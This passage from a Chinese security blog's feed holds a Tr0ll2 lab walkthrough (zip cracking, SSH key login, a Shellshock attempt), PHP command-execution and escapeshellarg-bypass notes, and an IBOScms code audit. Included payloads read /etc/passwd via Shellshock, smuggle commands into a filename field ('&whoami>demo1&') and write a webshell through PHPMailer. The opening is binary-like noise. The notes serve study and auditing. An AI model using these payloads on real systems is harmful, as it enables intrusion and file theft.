class="line">BI%z</span><br><span class="line">2\7c</span><br><span class="line">:t@n~@</span><br><span class="line">        .qtI</span><br><span class="line">$pGd</span><br><span class="line">8VVz</span><br><span class="line">nQ~4</span><br><span class="line">j--h</span><br><span class="line">8WSs</span><br><span class="line">@QEw^?</span><br><span class="line">nwyA</span><br><span class="line">aQ3O</span><br><span class="line">XBuJm08\&amp;</span><br><span class="line">&quot;PzJz</span><br><span class="line">&gt;%cwJ</span><br><span class="line">t+7&gt;</span><br><span class="line">&#x27;h(:</span><br><span class="line">]O7U</span><br><span class="line">ew\\</span><br><span class="line">0&gt;!-</span><br><span class="line">1=xA0A</span><br><span class="line">A+eW</span><br><span class="line">H `q</span><br><span class="line">B1Ow</span><br><span class="line">~Q4awpX=</span><br><span class="line">0J&lt;n</span><br><span class="line">v&amp;8Y</span><br><span class="line">Z8$.</span><br><span class="line">yS-[</span><br><span class="line">2 -,</span><br><span class="line">e6mh</span><br><span class="line">&#123;D c</span><br><span class="line">Il-FkKv</span><br><span class="line">i&#123;j68</span><br><span class="line">XL&#123;#</span><br><span class="line">*Mqhq</span><br><span class="line">O\ +</span><br><span class="line">Sk~B</span><br><span class="line">[jmdR</span><br><span class="line">Ol;I</span><br><span class="line">&#x27;%jq</span><br><span class="line">iZ7%</span><br><span class="line">Po.d</span><br><span class="line">I &#123;-G&gt;</span><br><span class="line">        ^ah</span><br><span class="line">&#123;)V,</span><br><span class="line">8]-#</span><br><span class="line">g&lt;.&#125;</span><br><span class="line">&#x27;o&amp;Q</span><br><span class="line">4F8Q</span><br><span class="line">        -wC</span><br><span class="line"> F&gt;J</span><br><span class="line">_mg=</span><br><span class="line">i&#123;&amp;0</span><br><span class="line">1ancNpG*</span><br><span class="line">=VZ[MH</span><br><span class="line">hZOtY</span><br><span class="line">&#x27;=!)</span><br><span class="line">Bwgq</span><br><span class="line">Ws_4\2&#123;.M</span><br><span class="line">&amp;yC*</span><br><span class="line">;,?     @</span><br><span class="line">g%t.</span><br><span class="line">).eG`</span><br><span class="line">:q+|</span><br><span class="line">tA&#123;vF</span><br><span class="line">_R4+</span><br><span class="line">V&#x27;E[</span><br><span class="line">XKwyDOt</span><br><span class="line">f&gt;U_</span><br><span class="line">6 ;+5</span><br><span class="line">q/2~WB</span><br><span class="line">Xi]5</span><br><span class="line">tT]+_</span><br><span class="line">kTm6</span><br><span class="line">0W;u</span><br><span class="line">+cih</span><br><span class="line">Qhcv</span><br><span class="line">`*0G</span><br><span class="line">nD&#123;-4/</span><br><span class="line">pzw\</span><br><span class="line">GkDu(</span><br><span class="line">FprFAF@</span><br><span class="line">2;.uG</span><br><span class="line">+=\k</span><br><span class="line">UN&quot;1</span><br><span class="line">khTvH</span><br><span class="line">Q&#125;Jm</span><br><span class="line">ee-&gt;</span><br><span class="line">k!;Z</span><br><span class="line">ivc2</span><br><span class="line">ZMV0</span><br><span class="line">-wI&lt;</span><br><span class="line">nCO%?C</span><br><span class="line">.&lt;vI</span><br><span class="line">QLON</span><br><span class="line">@Si;X&#x27;</span><br><span class="line">f02HP</span><br><span class="line">8Jh;</span><br><span class="line">gYCJ</span><br><span class="line">pV&#125;A</span><br><span class="line">7U      4</span><br><span class="line">]=%em;</span><br><span class="line">lj\p</span><br><span class="line">*/ p?E$</span><br><span class="line">Look Deep within y0ur_self for the answer</span><br></pre></td></tr></table></figure></p><p>look deep within <a href="">y0ur_self</a> for the answer<br>要你深入到这个目录进行下一步</p><p>访问，里面有一个<code>answer.txt</code>文件</p><p>wget下来</p><p><img src="https://pic.imgdb.cn/item/67415dadd29ded1a8cadd186.png" alt=""></p><p>全是base64编码，通过<code>base64 -d answer.txt &gt; having_decode.txt</code>得到解码后的</p><p><img src="https://pic.imgdb.cn/item/67415e01d29ded1a8cae2094.png" alt=""></p><p>现在我们看回来哪个下载下下的lmao.zip,zip爆破的话有两种，分别是fcrackzip和zip2john</p><p>我们采用fcrackzip</p><p><img src="https://pic.imgdb.cn/item/67415fc7d29ded1a8cafd4cc.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">[-u] --use-unzip使用unzip清楚错误密码</span><br><span class="line"></span><br><span class="line">[-D] --distionary使用字典爆破</span><br><span class="line"></span><br><span class="line">[-p] --postion设置密码的位置</span><br><span class="line"></span><br><span class="line">[-c] --charset设置字符集</span><br><span class="line"></span><br><span class="line">[-b] --brute-force暴力破解</span><br><span class="line"></span><br><span class="line">[-l] --length设置密码长度</span><br><span class="line"></span><br><span class="line">[-u] --use-unzip使用unzip清楚错误密码</span><br><span class="line"></span><br><span class="line">[-D] --distionary使用字典爆破</span><br><span class="line"></span><br><span class="line">[-p] --postion设置密码的位置</span><br><span class="line"></span><br><span class="line">[-c] --charset设置字符集</span><br><span class="line"></span><br><span class="line">[-b] --brute-force暴力破解</span><br><span class="line"></span><br><span class="line">[-l] --length设置密码长度</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="John爆破文件"><a href="#John爆破文件" class="headerlink" title="John爆破文件"></a>John爆破文件</h2><p>Docx ：</p><p>你可以进入<code>usr/share/john</code>查看john下的文件你会发现这个东西可以爆破7z,office等等文件</p><p>对于docx这种一般都是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./office2john.py test.docx &gt; docx.txt   将docx的hash值保存在docx.txt文件中</span><br><span class="line"></span><br><span class="line">john -w=./password|txt docx.txt  爆破docx文件</span><br></pre></td></tr></table></figure><p>Xlsx：<br>和docx的一样</p><p>回归正题</p><p>密码爆破出来了,</p><p>ssh链接一下<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh noob@192.168.199.132</span><br></pre></td></tr></table></figure></p><p>要求我们输入密码，但是我们上面解压出来了一个私钥，理论上说是不需要密码直接可以登录的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">chmod 400 noob</span><br></pre></td></tr></table></figure><h2 id="补充一下"><a href="#补充一下" class="headerlink" title="补充一下"></a>补充一下</h2><p>chmod 是控制用户对文件的权限进行操作的命令</p><p>linux/unix的文件调用权限分为三级：文件所有者(owner)，用户组（group）,其他用户(other user)</p><p><img src="https://pic.imgdb.cn/item/67429b70464e47f200109a98.png" alt=""></p><p>就像是这样的</p><p><img src="https://pic.imgdb.cn/item/67429ba5464e47f20010bb87.png" alt=""></p><p>三位，第一位对应的是read读取，第二位对应的是write写入，第三个对应的是run执行</p><p>所以用二进制码就是</p><p><img src="https://pic.imgdb.cn/item/67429c2f464e47f2001123b8.png" alt=""></p><p>报错格式不对（但是教学中时报TRY MARDER LOL!Connecction to xxx.xxx.xxx.xxx closed）🤔</p><p><img src="https://pic.imgdb.cn/item/67429e04606cc3b2cd9f7a6b.png" alt=""></p><p>按照他说的是目标靶机的ssh配置有问题，他的环境变量不允许使用<code>/bin/bash</code>和<code>/bin/sh</code></p><h2 id="shell破壳漏洞"><a href="#shell破壳漏洞" class="headerlink" title="shell破壳漏洞"></a>shell破壳漏洞</h2><p>shellshork原理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[04/14/2021 00:28] seed@ubuntu:~$ foo=&#x27;() &#123; echo &quot;wdnmd&quot;; &#125; ;echo &quot;8848&quot;;&#x27;</span><br><span class="line">[04/14/2021 00:29] seed@ubuntu:~$ echo $foo</span><br><span class="line">() &#123; echo &quot;wdnmd&quot;; &#125; ;echo &quot;8848&quot;;</span><br><span class="line">[04/14/2021 00:29] seed@ubuntu:~$ export foo</span><br><span class="line">[04/14/2021 00:29] seed@ubuntu:~$ bash</span><br><span class="line">8848</span><br><span class="line">[04/14/2021 00:29] seed@ubuntu:~$ declare -f foo</span><br><span class="line">foo () </span><br><span class="line">&#123; </span><br><span class="line">    echo &quot;wdnmd&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>foo原本是一个shell变量，但是在<code>export foo</code>使得其编程环境变量后，在子shell进程中,foo成为了一个函数，并且命令行自动执行了echo “8848”的命令</p><p><img src="https://pic.imgdb.cn/item/6742b15188c538a9b5bb423a.png" alt=""></p><p>对于满足shellshock的情景，我们可以构造出一个特殊的字符串，使得字符串前面部分是空函数定义，后面是用分号隔开的恶意指令</p><ul><li>环境变量必须以(){}开始</li><li>必须调用bash</li><li>系统存在bash漏洞</li></ul><p>后面看教程是`ssh noob@192.168.199.132 -i noob ‘(){:;}; cat /etc/passwd’</p><p>但是不知道为什么我的就是打不进去，他是</p><p><img src="https://pic.imgdb.cn/item/6742b9f188c538a9b5bb452b.png" alt=""></p><p>我是</p><p><img src="https://pic.imgdb.cn/item/6742b9f188c538a9b5bb452a.png" alt=""></p><p>所以后面就没法弹shell进行下一步操作，<a href="https://www.freebuf.com/vuls/331990.html">Troll2</a><br>，后面想看的可以看这个，满详细的</p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> tr0ll2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2025/01/08/2024%E5%B9%B411%E6%9C%8820%E6%97%A5-%E5%89%8D%E7%AB%AF%E6%BC%8F%E6%B4%9E/"/>
      <url>/2025/01/08/2024%E5%B9%B411%E6%9C%8820%E6%97%A5-%E5%89%8D%E7%AB%AF%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>php命令执行</title>
      <link href="/2025/01/08/2024%E5%B9%B411%E6%9C%8815%E6%97%A5-php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/2025/01/08/2024%E5%B9%B411%E6%9C%8815%E6%97%A5-php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<p>PHP命令执行函数<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">system：执行外部程序并显示输出</span><br><span class="line"></span><br><span class="line">passthru：执行外部程序并显示原始输出</span><br><span class="line"></span><br><span class="line">exec：执行外部程序并分会输出的最后一行</span><br><span class="line"></span><br><span class="line">shell_exec：通过shell执行外部命令并分会完整的处处作为字符串</span><br><span class="line"></span><br><span class="line">popen：打开一个管道执行fork命令</span><br><span class="line"></span><br><span class="line">proc_open：类似鱼popen</span><br><span class="line"></span><br><span class="line">pcntl_exec：在当前进程空间执行一个程序</span><br><span class="line"></span><br><span class="line">dl：在运行时加载一个php扩展</span><br><span class="line"></span><br><span class="line">`xx`</span><br><span class="line"></span><br></pre></td></tr></table></figure><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// system: 执行外部程序并显示输出</span><br><span class="line">echo &quot;system:\n&quot;;</span><br><span class="line">system(&#x27;dir&#x27;, $retval);</span><br><span class="line">if ($retval !== 0) &#123;</span><br><span class="line">    echo &quot;Error executing system command\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// passthru: 执行外部程序并显示原始输出</span><br><span class="line">echo &quot;\npassthru:\n&quot;;</span><br><span class="line">passthru(&#x27;dir&#x27;, $retval);</span><br><span class="line">if ($retval !== 0) &#123;</span><br><span class="line">    echo &quot;Error executing passthru command\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// exec: 执行外部程序并返回输出的最后一行</span><br><span class="line">echo &quot;\nexec:\n&quot;;</span><br><span class="line">$output = [];</span><br><span class="line">exec(&#x27;dir&#x27;, $output, $retval);</span><br><span class="line">if ($retval !== 0) &#123;</span><br><span class="line">    echo &quot;Error executing exec command\n&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    print_r($output);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// shell_exec: 通过shell执行命令并返回完整的输出作为字符串</span><br><span class="line">echo &quot;\nshell_exec:\n&quot;;</span><br><span class="line">$output = shell_exec(&#x27;dir&#x27;);</span><br><span class="line">if ($output === null) &#123;</span><br><span class="line">    echo &quot;Error executing shell_exec command\n&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo $output;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// popen: 打开一个管道，执行fork的命令</span><br><span class="line">echo &quot;\npopen:\n&quot;;</span><br><span class="line">$handle = popen(&#x27;dir&#x27;, &#x27;r&#x27;);</span><br><span class="line">if ($handle === false) &#123;</span><br><span class="line">    echo &quot;Error executing popen command\n&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    while (!feof($handle)) &#123;</span><br><span class="line">        echo fread($handle, 1024);</span><br><span class="line">    &#125;</span><br><span class="line">    pclose($handle);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// proc_open: 类似于popen，但提供了更多的进程控制</span><br><span class="line">echo &quot;\nproc_open:\n&quot;;</span><br><span class="line">$descriptorspec = [</span><br><span class="line">    0 =&gt; [&quot;pipe&quot;, &quot;r&quot;],  // 标准输入</span><br><span class="line">    1 =&gt; [&quot;pipe&quot;, &quot;w&quot;],  // 标准输出</span><br><span class="line">    2 =&gt; [&quot;pipe&quot;, &quot;w&quot;]   // 标准错误</span><br><span class="line">];</span><br><span class="line">$process = proc_open(&#x27;dir&#x27;, $descriptorspec, $pipes);</span><br><span class="line">if (is_resource($process)) &#123;</span><br><span class="line">    while ($s = fgets($pipes[1])) &#123;</span><br><span class="line">        echo $s;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose($pipes[0]);</span><br><span class="line">    fclose($pipes[1]);</span><br><span class="line">    fclose($pipes[2]);</span><br><span class="line">    proc_close($process);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;Error executing proc_open command\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p><img src="https://pic.imgdb.cn/item/673d7b53d29ded1a8ca2d0bc.png" alt=""></p><h2 id="命令执行漏洞特点"><a href="#命令执行漏洞特点" class="headerlink" title="命令执行漏洞特点"></a>命令执行漏洞特点</h2><p>· 没有给命令传入参数的方法</p><p>· 字符串拼接</p><h2 id="命令执行过滤函数"><a href="#命令执行过滤函数" class="headerlink" title="命令执行过滤函数"></a>命令执行过滤函数</h2><p>· escapeshellcmd</p><p>· escapeshellarg</p><p>上面两个的作用都是转义，但是详细还是不一样的，比如说</p><p><code>escapeshellcmd</code>更多的是转义字符串中的特殊字符，以确保整个命令字符串的安全。它主要用于转义完整的命令行。<br>只要有shell命令就会被反引号转义</p><p><code>escapeshellarg</code>义单个命令参数，以确保参数被正确处理，即使参数中包含空格或其他特殊字符。它主要用于转义单个参数</p><p><img src="https://pic.imgdb.cn/item/673dab51d29ded1a8cd1016f.png" alt=""></p><p>在<code>escapeshellcmd</code>中是可以进行前者的<code>tail -n 5 /etc/passwd</code>的命令执行，但是不可以执行<code>tail -n 5 /etc/passwd;id</code>，因为id会在后面被反引号注释掉，但是在<code>escapeshellarg</code>中是不可以的</p><p><a href="https://www.leavesongs.com/PENTTRATION/PHPMailer-CVE-2016-10033.html">PHPMailer 代码执行漏洞</a></p><p>他的问题是<code>mail</code>函数调用了系统的mail命令，但是他用用户传给mail函数的第4个参数<code>$params=escapeshellcmd($params)；</code>拼接到mail中，</p><p>但是mail函数的-x命令后面可以指定一个输出的文件名，将mail的日志输出到这个文件中，当我们传入<code>params=&quot;-X /var/www/html/webshell.php&quot;；</code>的时候虽然有转义但是不妨碍我内部的文件的结果，这就导致了命令执行</p><p><img src="https://pic.imgdb.cn/item/673dad83d29ded1a8cd3bbbe.png" alt=""></p><p>但是实际上<code>escapeshellcmd</code>和<code>escapeshellarg</code>都是不安全的，因为他们都是基于黑名单的，所以我们都可以通过绕过黑名单来进行命令执行</p><p><a href="https://www.leavesongs.com/PENTTRATION/escapeshellarg-and-parameter-injection.html">谈escapeshellarg绕过与参数注入漏洞</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public function searchTree($query, $branch)</span><br><span class="line">&#123;</span><br><span class="line">    if (empty($query)) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $query = escapeshellarg($query);</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        $results = $this-&gt;getClient()-&gt;run($this, &quot;grep -i --line-number &#123;$query&#125; $branch&quot;);</span><br><span class="line">    &#125; catch (\RuntimeException $e) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>escapeshellarg</code>只能对你的单引号逃逸等做限制，但是他并没有对你的参数做限制，所以我们可以通过<code>grep -i --line-number &#39;test&#39; /etc/passwd;id</code>,<code>--open-files-in-pager=id</code>来进行命令执行，<br>就是说只能限制单双引号等符号但是不能限制你的函数原本就有的参数</p><p>修复方法就是在参数前面加<code>--</code>，这样就可以避免参数注入，因为lunux将会把<code>--</code>后面的参数当做参数而不是命令 </p><p>如果你想读取只需要在前面加上<code>--</code>或者<code>./</code>就可以</p><p><img src="https://pic.imgdb.cn/item/673db1b1d29ded1a8cd8f9a5.png" alt=""></p><h3 id="PHP中xml实体注入漏洞"><a href="#PHP中xml实体注入漏洞" class="headerlink" title="PHP中xml实体注入漏洞"></a>PHP中xml实体注入漏洞</h3><p>xml解析函数<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">simplexml_load_file</span><br><span class="line">simpxml_load_string</span><br><span class="line">Simplexmlelement</span><br><span class="line">domdocument</span><br><span class="line">xml_parse</span><br></pre></td></tr></table></figure></p><p>但是现在xxe漏洞逐渐减少</p><ul><li>PHP XML操作以来libxml库</li><li>libxml2.9.0默认关闭xml外部实体解析开关</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;php</span><br><span class="line">libxml_disable_entity_loader(true);</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p>禁用外部实体加载</p><p>挖掘的时候可以通过搜索核心函数就行暴力查找</p><p><img src="https://pic.imgdb.cn/item/673db438d29ded1a8cdd0f47.png" alt=""></p><p>如果无实际的输入输出点的话</p><p>我们要通过blind_xxe</p><ul><li>利用外部实体功能读取文件</li><li>利用外部实体发送http请求</li><li>利用http协议传递文件内容</li></ul><p>像是这种的</p><p><img src="https://pic.imgdb.cn/item/673db4ded29ded1a8cde1813.png" alt=""></p><p>就是通过http协议进行文件的读取</p><p><a href="https://explainshell.com/">php函数命令解释</a></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IBOScms代码审计</title>
      <link href="/2025/01/08/2024%E5%B9%B410%E6%9C%887%E6%97%A5-IBOS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
      <url>/2025/01/08/2024%E5%B9%B410%E6%9C%887%E6%97%A5-IBOS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p><img src="https://pic.imgdb.cn/item/6703e174d29ded1a8c971ad2.png" alt=""></p><p>在这里的只有这个地方可以修改，猜测可能存在文件读取，命令执行，sql注入等 漏洞，抓包查看路由以及传参</p><p><img src="https://pic.imgdb.cn/item/6703e12ad29ded1a8c96be55.png" alt=""></p><p><img src="https://pic.imgdb.cn/item/6703f031d29ded1a8ca66be2.png" alt=""></p><p>这里使用了<code>dbSubmit</code>，这个在数据包中发现是1，这里的作用是检查表单是否已经提交</p><p>在第33行调用了<code>database</code>的<code>databaseBackup()</code>方法，跟进一下</p><p><img src="https://pic.imgdb.cn/item/6703f31cd29ded1a8ca95c5a.png" alt=""></p><p>这里235行通过控制<code>filename</code>参数来控制我们上传的文件名，236行对一些后缀进行了过滤</p><blockquote><p>getRequest()方法则是获取我们不同类型的请求参数，getQuery、getPost、getParam这些方法是YII框<br>架下封装好的一些获取请求参数的方法这些方法可直接调用</p></blockquote><p><img src="https://pic.imgdb.cn/item/6703f5f1d29ded1a8cac3899.png" alt=""></p><p>我们知道<code>filename</code>可控，那我们就跟踪<code>$filename</code></p><p><img src="https://pic.imgdb.cn/item/6703f5dbd29ded1a8cac1ebc.png" alt=""></p><p>这里是将<code>/  \\  .  &#39;</code>替换成了空进行了第二次过滤后赋值给<code>$backupFileName</code></p><p>下面设置<code>$method=multivol</code>，并将<code>$backupFileName</code>赋值给<code>$dumpFile</code></p><p><img src="https://pic.imgdb.cn/item/6703f6e6d29ded1a8cad3602.png" alt=""></p><p>else的话也是经过分支拼接到<code>dumpFile</code>,但是这里的<code>dumpFile</code>后续会被拼接到这里</p><p><img src="https://pic.imgdb.cn/item/6703f7c1d29ded1a8cae729e.png" alt=""></p><p>这里用到了反引号并且<code>dumpfile</code>可控，所以我们可以传入<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;whoami&gt;demo1&amp;</span><br></pre></td></tr></table></figure></p><p>进行命令执行</p><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>在标签页</p><p><img src="https://pic.imgdb.cn/item/67052812d29ded1a8ca9d268.png" alt=""></p><p>里面的汇报中</p><p><img src="https://pic.imgdb.cn/item/6705282dd29ded1a8ca9ea51.png" alt=""></p><p>存在sql的报错</p><p><img src="https://pic.imgdb.cn/item/6705282cd29ded1a8ca9ea16.png" alt=""></p><p>抓包看看</p><p><img src="https://pic.imgdb.cn/item/6705285dd29ded1a8caa1698.png" alt=""></p><p>通过api控制器调用了module层的getlist类，跟进查看</p><p><img src="https://pic.imgdb.cn/item/670529ecd29ded1a8cab7f41.png" alt=""></p><p>结合数据包我们可以发现存在问题的是<code>keyword</code>的<code>subject</code></p><p>跟踪一下发现</p><p><img src="https://pic.imgdb.cn/item/67052a9dd29ded1a8cac1bb9.png" alt=""></p><p>30行判断<code>keyword</code>是否存在，32行将他带入到<code>getListCondition</code>里面,<code>getListCondition</code>是进行sql拼接查询的，将结果带入到33行的<code>getListCondition</code>方法进行的sql参数执行的操作</p><p>这里教程是用的debug的方式查看参数的传递过程，但是不知道为什么我的xdebug每次一调试就是</p><p><img src="https://pic.imgdb.cn/item/67061b80d29ded1a8c654eb0.png" alt=""></p><p>导致我调试不了</p><p>教程是说</p><p>这里经过调试最后返回的结果是完整的没对特殊字符进行过滤的完整sql语句</p><p><img src="https://pic.imgdb.cn/item/67061ca1d29ded1a8c66e26d.png" alt=""></p><p>原因是YII框架的DB类库没有对sql进行处理兵器开发人员在二次开发的过程中没对报错进行异常捕获导致产生错误</p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p><img src="https://pic.imgdb.cn/item/67066381d29ded1a8c9f7e82.png" alt=""></p><p>这里可以自定义上传的文件类型，所以我们可以通过修改这个来进行文件上传，发现定义了.php还是不能上传</p><p><img src="https://pic.imgdb.cn/item/67066494d29ded1a8ca04bc2.png" alt=""></p><p>抓包分析路由</p><p><img src="https://pic.imgdb.cn/item/6706944ed29ded1a8cc5fe75.png" alt=""></p><p>这里是调用的file文件夹下面的personal的add，所以我们能找到<code>actionadd</code><br>方法，这个方法是通过op参数帮助我们进行功能定位，但是他会先调用<code>actionindex</code>方法获取后台配置参数</p><p><img src="https://pic.imgdb.cn/item/670697c6d29ded1a8cc8f23e.png" alt=""></p><p>在 <code>actionIndex</code> 方法中调用了<code>getUploadConfig</code>获取上传配置参数</p><p><img src="https://pic.imgdb.cn/item/67069809d29ded1a8cc924e4.png" alt=""></p><p>跟踪发现进行了一些过滤</p><p><img src="https://pic.imgdb.cn/item/6706984bd29ded1a8cc95c17.png" alt=""></p><p>他107的<code>dangerTags</code>中如果存在变量就要unset</p><p><img src="https://pic.imgdb.cn/item/670698a6d29ded1a8cc9a039.png" alt=""></p><p>所以我们的php没法上传</p><p>但是我们真正上传的类中还包含着过滤</p><p><img src="https://pic.imgdb.cn/item/670698f1d29ded1a8cc9dd34.png" alt=""></p><p>它调用了<code>CommonAttach</code>类下的方法，这里面封装着所有用于上传的方法</p><p><img src="https://pic.imgdb.cn/item/67069948d29ded1a8cca21ff.png" alt=""></p><p>这里的<code>checkExt</code>就是第二处过滤的地方了</p><p><img src="https://pic.imgdb.cn/item/67069973d29ded1a8cca4268.png" alt=""></p><p>所以我们可以用<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gif</span><br><span class="line"></span><br><span class="line">.htaccess</span><br></pre></td></tr></table></figure></p><p>等等进行文件上传</p><h2 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h2><p>查找危险函数unlink，发现这个</p><p><img src="https://pic.imgdb.cn/item/67069b02d29ded1a8ccbd4b9.png" alt=""></p><p>这里通过post获取<code>kety</code>，然后判断是不是文件就进行了删除</p><p>所以可以抓一个删除包然后进行<code>../</code>的返回，类似这样</p><p><img src="https://pic.imgdb.cn/item/67069b7ad29ded1a8ccc479d.png" alt=""></p><p>至此，结束iboscms</p><p>总结：</p><p>yii框架有明显的过滤但是在module层没有封装好导致可能存在sql漏洞</p><p>unlink危险函数</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bosscms代码审计</title>
      <link href="/2025/01/08/2024%E5%B9%B410%E6%9C%884%E6%97%A5-bosscms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
      <url>/2025/01/08/2024%E5%B9%B410%E6%9C%884%E6%97%A5-bosscms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
      
